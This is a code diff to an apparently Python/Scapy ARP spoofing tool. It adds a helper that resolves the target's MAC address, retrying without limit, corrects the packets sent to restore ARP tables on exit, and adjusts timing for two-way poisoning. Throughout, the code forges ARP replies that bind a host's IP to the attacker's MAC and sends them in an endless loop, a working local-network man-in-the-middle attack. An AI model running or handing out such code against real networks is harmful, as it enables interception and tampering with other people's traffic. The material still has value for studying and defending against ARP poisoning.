@@ -37,14 +37,20 @@ def main():
     host = args[0]
     mac = get_if_hwaddr(options.interface)
 
+    def get_target_mac_by_ip(target):
+        print ("[*] Resolving target's mac address. If this takes more than"
+        " a few seconds, check if the target can be reached on the network.")
+        target_mac = getmacbyip(target)
+        while not target_mac:
+            target_mac = getmacbyip(target)
+        print "[*] Success!"
+        return target_mac
+
     def build_req(target, host):
         if target is None:
             pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=host, pdst=host)
         elif options.target:
-            target_mac = getmacbyip(target)
-            if target_mac is None:
-                print "[-] Error: Could not resolve targets MAC address"
-                sys.exit(1)
+            target_mac = get_target_mac_by_ip(target)
             pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=host, hwdst=target_mac, pdst=target)
 
         return pkt
@@ -53,10 +59,7 @@ def main():
         if target is None:
             pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=host, op=2)
         elif target:
-            target_mac = getmacbyip(target)
-            if target_mac is None:
-                print "[-] Error: Could not resolve targets MAC address"
-                sys.exit(1)
+            target_mac = get_target_mac_by_ip(target)
             pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=host, hwdst=target_mac, pdst=target, op=2)
 
         return pkt
@@ -65,11 +68,11 @@ def main():
         sleep(1)
         print '\n[*] Re-arping network'
         rearp_mac = getmacbyip(host)
-        pkt = Ether(src=rearp_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=host, hwsrc=mac, op=2)
+        pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=host, hwsrc=rearp_mac, op=2)
         sendp(pkt, inter=1, count=5, iface=options.interface)
         if options.reverse:
             r_rearp_mac = getmacbyip(options.target)
-            r_pkt = Ether(src=r_rearp_mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=options.target, hwsrc=mac, op=2)
+            r_pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(psrc=options.target, hwsrc=r_rearp_mac, op=2)
             sendp(r_pkt, inter=1, count=5, iface=options.interface)
         sys.exit(0)
 
@@ -98,4 +101,4 @@ def main():
     while True:
         sendp(pkt, inter=2, iface=options.interface)
         if options.reverse:
-            sendp(r_pkt, inter=2, iface=options.interface)
+            sendp(r_pkt, iface=options.interface)
